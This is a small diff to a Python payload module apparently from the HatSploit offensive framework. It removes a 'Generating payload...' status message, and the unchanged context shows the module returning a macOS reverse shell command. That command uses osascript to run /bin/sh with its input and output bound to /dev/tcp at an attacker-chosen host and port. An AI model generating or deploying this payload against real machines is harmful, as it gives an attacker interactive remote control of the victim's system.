@@ -45,7 +45,5 @@ class HatSploitPayload(Payload, TCPClient):
     def run(self):
         local_host, local_port = self.parse_options(self.options)
 
-        self.output_process("Generating payload...")
         payload = f"osascript -e 'do shell script \"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1 &\"'"
-
         return payload
